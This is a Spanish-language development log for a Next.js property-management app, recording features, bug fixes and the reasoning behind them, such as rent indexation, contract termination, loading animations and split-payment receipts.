# LOG.md — Arce Administración

Registro de sesiones de trabajo. Más nueva arriba.

---

## 2026-05-17 — Control de versiones, eliminación de propiedades, rescisión de contratos y rediseño de lista de contratos

### Qué hice

**1. Control de versiones con GitHub (ya existía, lo formalizamos)**
Confirmamos que el proyecto ya tiene Git + GitHub configurado. Establecimos el flujo: trabajo diario en `dev-gaston` (antes `dev`), producción solo en `main`. Renombramos la rama `dev` a `dev-gaston` para cuando se sume un segundo programador.

**2. Eliminación de propiedades**
Agregué un botón de 3 puntos en la ficha de cada propiedad que abre un menú con la opción "Eliminar". Antes de borrar, verifica si la propiedad tiene contratos vinculados — si los tiene, bloquea la eliminación con un mensaje claro en lugar de dejar al usuario en un estado roto.

**3. Rescisión de contratos**
El botón "Rescindir contrato" no hacía nada (le faltaba el `onClick`). Lo conecté con la lógica existente de enmiendas (`POST /api/contracts/[id]/amendments`), agregué un `AlertDialog` con selector de fecha efectiva, y el estado del contrato cambia a `terminated` al confirmar.

**4. Rediseño de la lista de contratos**
- Filtros agrupados con sub-filtros: "Todos" / "Activos" / "En proceso" (borrador + pendiente de firma) / "Terminados" (vencidos + rescindidos)
- Color semántico por grupo: verde para activos, azul tranquilo para en proceso, rojo grisáceo para terminados
- Contratos terminados con opacidad reducida (45% en reposo, 80% al hover)
- N° de contrato tintado levemente según el grupo al que pertenece
- Sub-filtros aparecen con animación de entrada
- Orden por defecto: en proceso → activos → terminados
- Estado vacío contextual según el filtro activo

### Por qué lo hice así y no de otra forma

**Bloqueo en lugar de error silencioso para la eliminación**: si intentás borrar una propiedad con contratos, la base de datos la hubiera rechazado con un error críptico de FK violation. En cambio, la API verifica primero y devuelve un 409 con un mensaje que el usuario entiende. La verificación va en el servidor, no en el cliente, porque el cliente nunca es fuente de verdad.

**`type: "termination"` en la enmienda**: el contrato ya tenía un sistema de historial de cambios (`amendments`). Rescisión es solo un cambio de estado — en lugar de crear una tabla nueva, usamos ese mecanismo y guardamos qué estado tenía antes y cuál tiene después.

**CASE expression en SQL para el ordenamiento**: quería que los contratos "en proceso" aparecieran primero sin agregar una columna de orden a la base de datos. SQL tiene `CASE WHEN status = 'draft' THEN 0 ...` que asigna un número a cada estado solo al momento de la query, sin tocar el schema.

**Colores OKLCH inline en vez de clases Tailwind**: las clases de Tailwind se compilan en build time — `oklch(0.58 0.07 245 / 0.11)` no es una clase Tailwind conocida, así que usé `style={{ background: "oklch(...)" }}` directamente. Para el verde de activos sí usé clases (`bg-income-dim`) porque ya existían definidas en el sistema de diseño.

### Conceptos que aparecieron

- **FK violation (Foreign Key)**: error de base de datos que ocurre cuando intentás borrar un registro que otros registros referencian. Como si quisieras borrar a un propietario que tiene propiedades — la DB lo rechaza porque quedarían propiedades "huérfanas". El bloqueo preventivo en la API da un mensaje útil en lugar del error técnico.
- **HTTP 409 Conflict**: código de respuesta para "la operación no puede completarse porque el estado actual lo impide". Distinto de 400 (datos inválidos) o 500 (error inesperado). Es el código semánticamente correcto para "no podés borrar esto porque hay algo vinculado".
- **CASE expression en SQL**: operador que asigna valores temporales durante una query. `CASE status WHEN 'draft' THEN 0 WHEN 'active' THEN 1 END` crea una columna virtual solo para ese `ORDER BY`, sin cambiar el schema.
- **OKLCH**: sistema de color que funciona en términos de luminosidad, croma y matiz. A diferencia de `hsl`, los colores a igual luminosidad se ven perceptualmente iguales. Útil para ajustar colores con precisión quirúrgica desde el código.
- **Rama personal por desarrollador**: cada programador trabaja en su propia rama (`dev-gaston`, `dev-[otro]`). Se integra a `main` cuando está estable. Evita que los cambios de uno bloqueen al otro mientras trabajan sobre cosas distintas.

### Preguntas para reflexionar

1. ¿Por qué la verificación de contratos vinculados va en el servidor y no en el cliente?
2. Si tuvieras que agregar una "papelera" (borrado suave, no definitivo), ¿qué cambiaría en la DB y en la UI?
3. ¿En qué se diferencia un `amendment` de un `event`? ¿Cuándo usarías uno y cuándo el otro?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: FK violation — qué es, cuándo ocurre, cómo manejarlo con 409
- [ ] **Decisión técnica**: por qué usar CASE expression en vez de columna de orden
- [ ] **Patrón**: bloqueo preventivo en DELETE — verificar relaciones antes de borrar
- [ ] **Decisión técnica**: rama personal por desarrollador vs rama compartida

---

## 2026-05-11 — Navegación instantánea con loading.tsx + animaciones en índices

### Qué hice

Dos mejoras en esta parte de la sesión:

**1. Barra de progreso de navegación (`loading.tsx`)**
Creé `src/app/(dashboard)/loading.tsx` con una barra de progreso terracota de 2px que aparece en la parte superior de la pantalla en el instante en que el usuario hace clic en un link del sidebar. La barra avanza hasta el 92% mientras el servidor responde, y desaparece cuando la nueva página está lista.

**2. Animaciones en el panel de índices de ajuste**
En `src/components/contracts/index-values-panel.tsx` agregué dos animaciones:
- **Stagger al abrir el panel**: cada vez que el usuario expande el acordeón, los 12 cards de meses aparecen de izquierda a derecha con 28ms de separación.
- **Flash verde en el card recién cargado**: cuando el usuario guarda un nuevo valor con "+ Cargar mes", ese card específico hace un pulso de luz verde durante 750ms.

También corregí un bug que introdujo el agente de contratos: `formatAddress()` estaba dentro del `.select()` de Drizzle, lo que causa un crash en runtime porque Drizzle solo acepta referencias a columnas en ese método, no funciones JavaScript.

### Por qué lo hice así y no de otra forma

**`loading.tsx` en lugar de nprogress o librerías similares**: `loading.tsx` es el mecanismo nativo de Next.js App Router para este problema. Las librerías externas (next-nprogress-bar, etc.) agregan JS al bundle del cliente y requieren un componente que escucha eventos del router. El `loading.tsx` no agrega nada al cliente — es solo un Server Component que Next.js muestra automáticamente.

**La barra llega al 92% y no al 100%**: si llegara al 100% antes de que el servidor respondiera, el usuario vería que "terminó" pero la pantalla no cambió. El 92% dice "estoy en eso" sin mentir. El 100% real ocurre cuando Next.js reemplaza el `loading.tsx` con la página nueva.

**Flash verde solo en el card nuevo, no en todos**: el usuario imaginó que los cards se "van poniendo verdes de a uno" al abrir el panel. Eso sería deshonesto — los datos llegan todos juntos desde la API, no mes a mes. El único momento honesto para un flash verde es cuando un dato *realmente* acaba de llegar al servidor: cuando el usuario carga un mes manualmente.

**El bug de Drizzle**: Drizzle es un query builder que traduce JavaScript a SQL. Su `.select()` construye la cláusula `SELECT` de la query. Ahí solo pueden ir cosas que SQL entiende: columnas, expresiones SQL, subqueries. Una función JavaScript como `formatAddress()` no existe en SQL, entonces falla en runtime. La solución: seleccionar las columnas crudas desde Drizzle y llamar `formatAddress()` en el `map()` de JavaScript, después de que la DB ya respondió.

**TDZ (Temporal Dead Zone)**: el bug de `Cannot access 'open' before initialization` ocurrió porque puse un `useEffect` que referenciaba `open` antes de que `const [open, setOpen] = useState()` fuera declarado. En JavaScript, `const` y `let` existen desde el inicio de la función pero no se pueden leer hasta que el código pasa por su declaración. Ese período se llama zona muerta temporal. El fix: mover todos los `useState` juntos al tope de la función, y los `useEffect` después.

### Conceptos que aparecieron

- **`loading.tsx` en Next.js App Router**: archivo especial que Next.js muestra automáticamente entre el clic en un link y la llegada de la respuesta del servidor. Crea un Suspense boundary implícito alrededor del `page.tsx`. Sin él, el browser se ve congelado durante ese intervalo.
- **Congelamiento de navegación**: el browser no actualiza visualmente la pantalla mientras espera la respuesta del servidor para una navegación. El usuario lo interpreta como lentitud aunque el servidor sea rápido. `loading.tsx` rompe esa ilusión mostrando feedback inmediato.
- **Temporal Dead Zone (TDZ)**: período en el que una variable `const`/`let` existe en el scope pero no se puede leer. Ocurre entre el inicio de la función y la línea de declaración. Acceder antes genera `ReferenceError`. Con `var` esto no pasa (se "eleva" a `undefined`), pero con `const`/`let` es un error explícito.
- **Query builder vs transformación de datos**: en Drizzle (y cualquier ORM/query builder), el `.select()` construye el SQL que se envía a la base de datos. Solo acepta expresiones que SQL entiende. La transformación de los datos (formatear, calcular, combinar) va en JavaScript, después de que la DB respondió.
- **Honestidad en animaciones**: una animación que muestra algo que no ocurrió (datos "llegando" cuando ya estaban todos) confunde al usuario cuando se rompe o cambia el timing. Las animaciones más efectivas están atadas a eventos reales: el panel se abre → cards aparecen; un dato llega → ese card parpadea.

### Preguntas para reflexionar

1. ¿Por qué el `loading.tsx` a nivel `(dashboard)` cubre todas las rutas del dashboard y no solo algunas?
2. Si el servidor respondiera en 50ms (muy rápido), ¿el usuario llegaría a ver la barra de progreso? ¿Importa si no la ve?
3. ¿Cuál es la diferencia entre el `<Suspense>` que ya teníamos en `page.tsx` y el `loading.tsx`? ¿Hacen lo mismo?

### Qué debería anotar en Obsidian

- [ ] Concepto: **`loading.tsx` en Next.js App Router** — qué es, cuándo se muestra, diferencia con `<Suspense>` manual
- [ ] Concepto: **Temporal Dead Zone (TDZ)** — qué es, por qué ocurre con `const`/`let`, ejemplo del bug de `open`
- [ ] Bug: **Drizzle + función JavaScript en `.select()`** — el error, por qué pasa, cómo reconocerlo, solución (seleccionar columnas crudas y transformar en JS)
- [ ] Decisión técnica: **Honestidad en animaciones** — cuándo animar refleja realidad vs. cuándo engaña, el caso de "poner verde de a uno"

---

## 2026-05-11 — Animaciones de carga en listados (skeleton + stagger)

### Qué hice

Apliqué un patrón de animación de carga a los 4 listados principales del sistema: inquilinos, propietarios, propiedades y contratos.

El cambio tiene dos partes:

1. **Skeleton de carga**: reemplacé el spinner (`Loader2` girando en un div vacío) por filas falsas que imitan la estructura real de cada tabla. Mientras los datos no llegan, la tabla aparece completa con formas grises animadas en lugar de datos reales.

2. **Entrada escalonada (stagger)**: cuando los datos llegan, cada fila entra con una animación de `opacity 0→1` + `translateY(8px→0)` en 280ms. Cada fila espera 45ms más que la anterior (fila 0 = 0ms, fila 1 = 45ms, fila 2 = 90ms...). Eso da el efecto de "van apareciendo de a poco".

También agregué soporte para `prefers-reduced-motion`: si el sistema operativo del usuario tiene activada esa opción de accesibilidad, la animación no ocurre.

Para los tres listados adicionales (propietarios, propiedades, contratos), usé agentes en paralelo — cada uno trabajó en su propio archivo sin interferir con los otros.

### Por qué lo hice así y no de otra forma

**Skeleton en lugar de spinner**: el spinner deja un "hueco" visual — el espacio que va a ocupar la tabla no existe todavía, entonces cuando los datos llegan hay un salto de layout. El skeleton anticipa la forma del contenido; no hay salto.

**CSS puro en lugar de Framer Motion**: para este caso alcanza con `@keyframes` + una variable CSS (`--row-delay`) para controlar el delay por fila. Framer Motion agrega ~30KB de bundle y su valor real aparece cuando necesitás animaciones coordinadas entre componentes o gestos. Acá era innecesario.

**Variable CSS `--row-delay` en lugar de clases Tailwind**: Tailwind genera clases en tiempo de compilación; no puede generar `delay-[${i * 45}ms]` dinámico. Con `style={{ "--row-delay": "${i * 45}ms" }}` el valor se pasa directamente al DOM y el CSS lo lee desde ahí.

**Agentes en paralelo para los 3 listados restantes**: los tres componentes eran independientes (archivos distintos, sin estado compartido). En lugar de hacerlos uno por uno y esperar 3x el tiempo, corrieron simultáneamente. El `globals.css` ya tenía el keyframe de la primera implementación — los agentes tenían instrucción explícita de no tocarlo.

### Conceptos que aparecieron

- **Perceived performance (rendimiento percibido)**: la pantalla no carga más rápido, pero se siente más rápida. El cerebro interpreta "ver algo" como "avance". Un skeleton activo engaña la espera mejor que un spinner porque anticipa la forma del contenido.
- **Skeleton screen**: técnica de UX donde se muestran formas grises animadas que imitan la estructura del contenido real mientras se espera la respuesta del servidor. Inventada por Facebook en 2013.
- **Staggered animation**: animación en la que múltiples elementos del mismo tipo entran con un pequeño delay entre sí. Crea sensación de fluidez y de que la UI "se está construyendo" ante tus ojos.
- **`prefers-reduced-motion`**: media query de CSS que detecta si el sistema operativo del usuario tiene activada la opción de reducir movimiento (pensada para personas con epilepsia o sensibilidad vestibular). Buena práctica desactivar animaciones cuando está activa.
- **CSS custom properties como argumentos de animación**: las variables CSS (`--row-delay`) se pueden setear desde el atributo `style` de React y leer desde cualquier regla CSS que aplique al elemento. Es la forma de pasar valores dinámicos a animaciones CSS sin JavaScript.
- **Layout shift**: cuando un elemento aparece de golpe y empuja el resto del contenido hacia abajo. El skeleton lo evita porque ocupa el mismo espacio que los datos reales desde el principio.
- **Agentes en paralelo**: en vez de ejecutar tareas independientes una por una, se despachan simultáneamente. Cada agente tiene contexto aislado y trabaja en su propio dominio. El tiempo total es el del agente más lento, no la suma de todos.

### Preguntas para reflexionar

1. ¿Por qué el skeleton tiene que imitar la *estructura* del contenido real y no puede ser simplemente una barra genérica? ¿Qué cambia en la experiencia?
2. Si tuvieras 50 filas en una tabla, ¿el stagger de 45ms por fila seguiría funcionando bien? ¿Cómo lo ajustarías?
3. ¿En qué casos concretos usarías Framer Motion en lugar de CSS puro?

### Qué debería anotar en Obsidian

- [ ] Concepto: **Perceived performance** — qué es, cómo funciona psicológicamente, ejemplos (skeleton screen, optimistic UI, progress bars)
- [ ] Patrón: **Skeleton screen + stagger en React** — receta con el código base (keyframe, clase CSS, variable `--row-delay`, componente SkeletonRow)
- [ ] Concepto: **`prefers-reduced-motion`** — qué es, cómo se usa en CSS, por qué importa para accesibilidad
- [ ] Decisión técnica: **CSS puro vs Framer Motion** — cuándo elegir cada uno

---

## 2026-05-10 — Mejoras al panel de proyección de alquiler

### Qué hice

1. **Visibilidad del panel**: cambié el fondo del botón de colapso de `bg-surface-low` a `bg-surface-mid`, agregué borde izquierdo con acento de color (`border-l-2 border-l-primary/40`), el ícono de tendencia pasó a color primario, y el chevron ahora rota 180° con transición CSS en lugar de intercambiar dos íconos.

2. **Tramo anterior visible**: el endpoint `/api/tenants/[id]/proyeccion` ahora incluye el tramo inmediatamente anterior al actual cuando cae dentro del contrato. Ejemplo: contrato que arrancó en Feb 2026 con frecuencia trimestral → ahora muestra el tramo Feb-Abr (que alimenta el ajuste de Mayo) además del tramo actual May-Jul.

3. **Fix del monto base del tramo actual**: antes, el tramo actual tomaba `c.monthlyAmount` de la DB como base. Cuando el ajuste de índice no fue aplicado todavía (porque el contrato se creó después de que los valores de IPC ya estaban cargados), ese monto es el original sin ajustar. Ahora: si no hay registro en `adjustment_application` para ese tramo, la base del tramo actual se calcula desde el `newAmount` proyectado del tramo anterior.

4. **Numeración y agrupación por año**: todos los tramos tienen un número secuencial (Tramo 1, Tramo 2...) calculado desde el inicio del contrato. El tramo actual dice "Tramo actual (N)". Los tabs se agrupan por año del contrato con una etiqueta "Año 1", "Año 2", etc.

5. **Filas proyectadas con estética diferenciada**: los meses sin valor real de IPC ahora tienen fondo ámbar oscuro (`bg-amber-950/30`) y un círculo "!" en lugar del tilde gris anterior. Los tabs muestran "!" en amarillo cuando algún mes del tramo es proyectado.

6. **Defensa ante cache stale en dev**: el componente filtra tramos sin `tramoNumber` definido (artefacto del hot-reload de Next.js que mezcla datos viejos en caché con nuevos del fetch).

### Por qué lo hice así y no de otra forma

- El tramo anterior lo construimos en el endpoint (no en el cliente) porque necesitamos la query a `adjustment_application` para saber si el ajuste ya fue aplicado y cuál era el monto anterior — esa lógica pertenece al servidor.
- No guardamos `prevNewAmount` en la DB; lo calculamos on-the-fly cada vez porque es puro cálculo determinístico a partir de IPC + monto base.
- El fix del base usa la proyección del tramo anterior (no el monto real de la DB) cuando no hay ajuste aplicado, para mostrar lo que *debería* ser la base — útil para que el usuario entienda qué esperar.

### Conceptos que aparecieron

- **`NaN !== NaN` en JavaScript**: cuando `tramoNumber` es `undefined`, `Math.ceil(undefined / 4)` da `NaN`, y como `NaN !== NaN` siempre, el `Array.find()` nunca encuentra el grupo y crea uno nuevo por cada elemento. Solución: filtrar antes de agrupar.
- **Hot-reload + TanStack Query en dev**: Next.js recarga módulos sin perder el estado del cliente React. TanStack Query guarda respuestas en memoria; si el endpoint cambia su estructura de respuesta, el cache viejo (con formato distinto) puede mezclarse visualmente durante el render intermedio. Hard-refresh del browser limpia el cache.
- **`stale-while-revalidate`**: patrón de React Query — muestra datos viejos inmediatamente mientras busca datos frescos en background. Evita pantallas de carga, pero requiere que el componente sea robusto ante datos de versiones anteriores.

### Preguntas para reflexionar

1. ¿Por qué el ajuste de Mayo no se aplicó automáticamente cuando se creó el contrato de Pancho, si los valores de IPC de Febrero y Marzo ya estaban cargados?
2. ¿Cómo detectarías, al crear un contrato, que hay tramos pasados que ya tienen valores de índice disponibles y que deberían ajustarse de inmediato?

### Qué debería anotar en Obsidian

- [ ] Bug: `NaN !== NaN` — por qué no podés usar `find()` con un valor NaN y cómo protegerte
- [ ] Patrón: cascade de monto base entre tramos — cómo propagar el proyectado cuando el ajuste real no se aplicó
- [ ] Concepto: stale-while-revalidate y por qué los componentes deben ser defensivos ante datos de versiones anteriores de un endpoint

---

## 2026-05-10 — IPC Córdoba: cron, backfill histórico y proyección de alquiler

### Qué hice

- Renombré `"IPC"` → `"IPC (Córdoba)"` en código y DB (2 contratos migrados en producción vía Neon MCP)
- Agregué cron diario (`/api/cron/fetch-ipc`) que llama a la API de estadísticas de Córdoba y carga el IPC del mes anterior si falta; protegido por `CRON_SECRET`; el proxy lo excluyó del guard de sesión (fix)
- Descubrí que la API del gobierno bloquea IPs fuera de Argentina (Vercel está en EE.UU.) → el cron falla por timeout; manejado con try/catch que devuelve 200 + mensaje en lugar de 500
- Cargué 36 meses de IPC histórico (abr-2023 a mar-2026) directamente en Neon con `run_sql_transaction` porque el backfill script corrió contra la DB local en lugar de producción
- Construí `RentProjectionPanel`: tabla colapsable en la cuenta corriente del inquilino que muestra mes a mes cómo evoluciona el alquiler dentro del tramo actual (y los siguientes hasta vencimiento), usando valores reales del IPC donde existen y el último conocido como proyección donde no

### Por qué lo hice así y no de otra forma

- La proyección es puro cálculo en el servidor (sin estado, sin escritura a DB) → endpoint GET simple, no mutation
- Mostramos hasta 3 tramos máximo para no abrumar; con tabs para navegar entre ellos
- Los meses proyectados se marcan con `~` para que sea claro qué es real y qué es estimación

### Conceptos que aparecieron

- **CKAN API**: formato de datos abiertos del gobierno; devuelve registros en formato ancho (cada mes = columna)
- **ConnectTimeoutError desde Vercel**: servidores en EE.UU./Europa, muchas APIs gubernamentales argentinas bloquean IPs extranjeras
- **`run_sql_transaction` vs `run_sql`**: Neon MCP no permite múltiples statements en un solo `run_sql`; hay que usar el de transacciones
- **Backfill contra DB equivocada**: el script corre con el `.env` local; si ese no apunta a Neon sino a postgres local, los datos no llegan a producción

### Preguntas para reflexionar

1. ¿Cómo haría para que el backfill script sepa que está corriendo contra producción y pida confirmación?
2. ¿Qué estrategia usarías para cargar índices de una API gubernamental que bloquea IPs extranjeras sin tener que hacerlo manualmente?

### Qué debería anotar en Obsidian
- [ ] Patrón: proyección de serie financiera mes a mes con factor compuesto (calcular, no guardar)
- [ ] Bug: script de carga corrió contra DB equivocada — cómo verificar antes de ejecutar
- [ ] Concepto: CKAN API — formato de datos abiertos gubernamentales

---

## 2026-05-09 — Ajuste de alquileres por índice (ICL / IPC / CER / UVA)

### Qué hice

Implementé el sistema completo de actualización de alquileres por índice. Desde cero: diseño, spec, plan de implementación en 5 tareas, código, tests, y deploy a `main`.

**Lo que se construyó:**

1. **Dos tablas nuevas en la DB** (`adjustment_index_value` y `adjustment_application`) — una guarda los valores mensuales de cada índice (ej: "IPC Mayo 2026 = 3%"), la otra guarda el historial de cada ajuste aplicado a cada contrato (factor compuesto, períodos usados, monto anterior → nuevo).

2. **Lógica central** (`src/lib/ledger/apply-index.ts`) — al cargar un valor de índice, el sistema busca todos los contratos activos con ese tipo de índice, calcula el tramo de ajuste siguiente, multiplica los N valores mensuales previos, y actualiza `contract.monthlyAmount` + entries del ledger.

3. **Caso provisorio** — si faltan valores para completar el cálculo, aplica el monto actual como "provisorio" con un badge. Cuando llega el valor faltante, recalcula y genera un ajuste correctivo.

4. **API REST** — 4 rutas: GET/POST `/api/index-values`, DELETE `/api/index-values/[id]`, GET `/api/index-values/adjustments`, DELETE `/api/index-values/adjustments/[id]`.

5. **UI** — panel colapsable en la página de contratos. Formulario de carga, tabla de valores con revert, historial de ajustes.

6. **10 tests unitarios** para las 3 funciones puras del módulo.

### Por qué lo hice así y no de otra forma

**Una tabla central de valores vs. porcentaje directo en el contrato:** la tabla central permite que cargar un valor actualice automáticamente todos los contratos afectados de una vez. Si fuera por contrato, el usuario tendría que entrar a cada uno.

**Multiplicación encadenada, no suma:** la ley argentina de alquileres usa factor compuesto. Sumar 2% + 3% + 2% = 7% está mal; la inflación acumula sobre sí misma. La fórmula correcta es 1,02 × 1,03 × 1,02 = 1,0712 (7,12%). La diferencia crece cuanto mayor es la inflación.

**`adjustment_application` es append-only:** cada ajuste (y cada corrección) crea un registro nuevo. El histórico nunca se modifica. Esto es auditoría real — en contabilidad, nunca se borra un asiento; se genera un contra-asiento.

**Tests solo para funciones puras:** las funciones con DB requieren una base de datos real (los mocks probados el año pasado fallaron en producción porque la realidad no coincidía con el mock). Las funciones puras (`calculateFactor`, `nextTramoStart`, `requiredMonthsForTramo`) no tienen efectos secundarios, así que los tests son confiables.

**Panel dentro de Contratos, sin ítem de menú separado:** los índices son una herramienta de gestión de contratos, no un módulo de negocio propio. No tiene sentido que los usuarios entren a "Índices" como sección principal.

### Conceptos que aparecieron

- **factor compuesto**: manera de calcular inflación acumulada. Si cada mes la inflación es x%, no sumás los porcentajes — multiplicás los factores. (1 + x/100) para cada mes. Funciona igual que el interés compuesto.
- **append-only audit log**: tabla de historial donde nunca modificás una fila existente. Cada evento (incluso una corrección) es un registro nuevo. Permite reconstruir el estado exacto en cualquier momento pasado.
- **`pendiente_revision`**: estado del ledger que significa "el monto todavía no se sabe". Es el puente entre "el contrato existe" y "el índice está cargado". El sistema resuelve estos estados al cargar un valor.
- **bug de timezone en tests**: `new Date("2024-07-01")` en JavaScript trata el string ISO como UTC. En Argentina (UTC-3), eso significa que la "medianoche del 1 de julio UTC" ya es las 21:00 del 30 de junio en Argentina — así que `getMonth()` devuelve 5 (junio) en vez de 6 (julio). Fix: agregar `T00:00:00` para forzar hora local.
- **TanStack Query con `enabled: open`**: las queries no se disparan cuando el panel está cerrado. Lazy loading: cargá los datos recién cuando el usuario abre la sección, no antes.

### Preguntas para reflexionar

1. Si cada mes hay que cargar un valor manualmente, ¿cuál sería el flujo más rápido para no olvidarse? ¿Un recordatorio, un dashboard, una alerta?
2. ¿Por qué el IPC de julio "no puede entrar en su propio cálculo"? ¿Qué pasaría si lo incluyeras?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: factor compuesto — qué es, por qué se usa en alquileres, analogía con interés compuesto, ejemplo con IPC
- [ ] **Bug**: timezone en `new Date()` con strings ISO — cómo reconocerlo (mes desfasado en UTC-3), fix con `T00:00:00`
- [ ] **Patrón**: append-only audit log — cuándo usarlo, qué hace imposible, cómo se diferencia de soft delete
- [ ] **Decisión técnica**: tabla central de índices vs. campo por contrato — contexto, alternativas, por qué la central escala mejor

---

## 2026-05-08 — Título dinámico por módulo en la pestaña del navegador

### Qué hice

Implementé títulos dinámicos en la pestaña del navegador para que cada módulo muestre su nombre (ej: "Inquilinos — Arce Administración") en lugar del genérico "Arce Administración".

**Cambios principales:**

1. **Root layout** (`src/app/layout.tsx`): cambié `title: "Arce Administración"` por un objeto con `template: "%s — Arce Administración"` y `default: "Arce Administración"`. El template es un molde: Next.js reemplaza `%s` con el título que defina cada página. Si ninguna página define título, usa el default.

2. **Páginas de lista** (`page.tsx` de cada módulo): agregué `export const metadata` con el nombre del módulo. Para los que tenían `"use client"` innecesario (propietarios, inquilinos, propiedades, contratos, servicios, tareas), saqué esa directiva y convertí las páginas en Server Components — podían importar los componentes cliente igual, sin ser clientes ellas mismas.

3. **Páginas de detalle** (`[id]/page.tsx`): esas sí necesitan `"use client"` por sus hooks. La solución fue crear un `layout.tsx` dentro de cada carpeta `[id]/` que exporta la metadata del módulo. Ese layout aplica a todas las sub-rutas anidadas (ej: `/propietarios/[id]/liquidacion` también hereda "Propietarios").

**Archivos modificados/creados:**
- `src/app/layout.tsx` — template de título
- `src/app/(dashboard)/tablero/page.tsx` — simplificado el título
- `src/app/(dashboard)/caja/page.tsx` — simplificado el título
- `src/app/(dashboard)/inquilinos/page.tsx`, `propietarios/page.tsx`, `propiedades/page.tsx`, `contratos/page.tsx`, `servicios/page.tsx`, `tareas/page.tsx` — removido `"use client"` + metadata agregada
- `src/app/(dashboard)/generador-documentos/page.tsx` — metadata agregada
- `src/app/(dashboard)/clientes/layout.tsx` — metadata agregada al layout existente
- `src/app/(dashboard)/inquilinos/[id]/layout.tsx`, `propietarios/[id]/layout.tsx`, `contratos/[id]/layout.tsx`, `propiedades/[id]/layout.tsx`, `generador-documentos/[id]/layout.tsx` — layouts nuevos con metadata

### Por qué lo hice así y no de otra forma

**Alternativa descartada — `generateMetadata` dinámico**: Next.js permite una función `generateMetadata({ params })` que puede hacer un fetch a la DB para mostrar el nombre real del inquilino en la pestaña (ej: "Paggi Malena — Arce Administración"). No lo hice porque el usuario pidió el nombre del módulo, no el nombre de la persona. Y hubiera requerido convertir las páginas de detalle en Server Components, lo cual es un refactor mayor.

**Por qué el `layout.tsx` en `[id]/` funciona**: en Next.js App Router, los layouts envuelven todo lo que esté anidado bajo ellos. Un layout en `/inquilinos/[id]/` aplica tanto a `/inquilinos/[id]` como a `/inquilinos/[id]/cualquier-subruta`. La metadata del layout se merge con la del root layout: el template del root toma el título del layout hijo y lo formatea.

### Conceptos que aparecieron

- **`<title>` del HTML**: etiqueta que controla el texto que aparece en la pestaña del navegador o en la barra de la PWA. No es parte del contenido visual de la página.
- **`metadata` en Next.js App Router**: export especial (solo en Server Components) que Next.js lee para generar el `<head>` del HTML antes de enviarlo al navegador. No puede usarse en archivos con `"use client"`.
- **template de metadata**: patrón `"%s — Arce Administración"` donde `%s` es un placeholder que Next.js reemplaza con el título de la página hija. Evita repetir el sufijo en cada archivo.
- **Server Component vs Client Component**: un Server Component se ejecuta en el servidor y puede exportar metadata, acceder a la DB, etc. Un Client Component (con `"use client"`) se ejecuta en el navegador y puede usar hooks. Un Server Component puede renderizar Client Components adentro, pero no al revés sin un boundary explícito.
- **`layout.tsx` como capa de metadata**: en Next.js, si una `page.tsx` no puede exportar metadata (porque tiene `"use client"`), se puede crear un `layout.tsx` en el mismo directorio que sí la exporte. El layout envuelve la página silenciosamente.

### Preguntas para reflexionar
1. ¿Por qué `"use client"` en un `page.tsx` que no usa ningún hook propio es innecesario, aunque adentro renderice componentes que sí los usan?
2. Si quisiera mostrar el nombre real del inquilino (ej: "Paggi Malena") en la pestaña, ¿qué tendría que hacer diferente con `generateMetadata`?

### Qué debería anotar en Obsidian
- [ ] Concepto: `metadata` y `generateMetadata` en Next.js App Router
- [ ] Concepto: Server Components vs Client Components — cuándo cada uno
- [ ] Patrón: layout.tsx como proxy de metadata para rutas con `"use client"`

---

## 2026-05-08 — Split modality: recibo, caja y flujo completo propietario

### Qué hice

**Contexto**: El sistema tenía varios bugs acumulados para contratos en modalidad "split" (el inquilino paga directamente al propietario y a la inmobiliaria por separado). Los corregimos uno por uno siguiendo el flujo real de cobro.

---

**Bug 1 — Honorarios calculados al 10% en lugar del 5% del contrato**

El componente `TenantTabCurrentAccount` tenía `honorariosPct = 10` como default del prop. Al emitir el recibo, enviaba ese valor hardcodeado al endpoint, ignorando el porcentaje real del contrato (5%). Fix: en la función `mutate`, usar `currentSplitMeta?.managementCommissionPct ?? honorariosPct`.

**Bug 2 — Emit route creaba 3 movimientos para split (igual que Modalidad A)**

Para Modalidad A (agencia cobra todo y después liquida al propietario) se crean 3 movimientos:
1. `alquiler` income agencia — lo que cobró la agencia
2. `ingreso_inquilino` income propietario — en tránsito para el dueño
3. `honorarios_administracion` expense agencia — comisión retenida

Para split, la agencia nunca toca el dinero del propietario. Solo corresponde 1 movimiento: `honorarios_administracion` income agencia. Fix en `src/app/api/receipts/emit/route.ts`: bifurcación por `paymentModality === "split"`.

**Bug 3 — Recibo del inquilino mostraba $40.000 como total en lugar de $756.175**

El recibo usaba `movimiento.amount` como total. Para split ese movimiento es el de honorarios ($40K). Pero el inquilino pagó $756K en total. Fix: sumar los `ledgerItems` con sus signos (descuentos negativos) para obtener el total real. Para mostrar el desglose, se agrega la sección "Distribución del pago" con propietario + administración y sus CBU/alias.

También fix colateral: los descuentos y bonificaciones ahora aparecen en rojo y negativo en la tabla del recibo (antes aparecían positivos).

**Bug 4 — KPIs de Caja General con doble conteo**

El total de ingresos sumaba todos los movimientos `income`, incluyendo `ingreso_inquilino` (propietario). Para Modalidad A eso duplicaba la cifra. Fix en `src/app/api/cash/movimientos/route.ts`: cambio de 3 KPIs (ingresos/egresos/saldo) a 3 con significado real:
- **Bruto cobrado** = income donde `tipoFondo = "agencia"`
- **A liquidar a propietarios** = income propietario − honorarios retenidos
- **Neto agencia** = bruto − a liquidar

**Bug 5 — Badge REC-XXXX en cuenta del propietario navegaba al recibo del inquilino**

En la cuenta corriente del propietario, el badge del número de recibo iba a `/recibos/n/[numero]` (vista del inquilino). Debería ir a `/comprobantes/[id]` (Constancia de Cobro Distribuido). Había dos causas encadenadas:

1. La query en `owners/[id]/cuenta-corriente/route.ts` buscaba el `cashMovementId` filtrando `categoria = "alquiler"`. Para split ese movimiento no existe. Fix: filtrar por `tipo = "income" + tipoFondo = "agencia"`, que cubre ambas modalidades.
2. El badge en `ledger-table.tsx` siempre iba a `/recibos/n/...`. Fix: si `isOwnerView && entry.cashMovementId`, ir a `/comprobantes/${cashMovementId}`.

**Limpieza de producción**

Se borraron los 13 movimientos de caja de producción (REC-0001 a REC-0005, todos eran de prueba). También se resetearon las entradas del ledger a `pendiente`. El próximo recibo será REC-0001 automáticamente.

---

### Por qué lo hice así y no de otra forma

**Split con 1 movimiento en vez de 3**: en split, la agencia nunca tuvo el dinero del propietario en su cuenta. Crear `ingreso_inquilino` sería registrar una deuda que no existe. Menos movimientos = menos superficie de error y cálculos más simples.

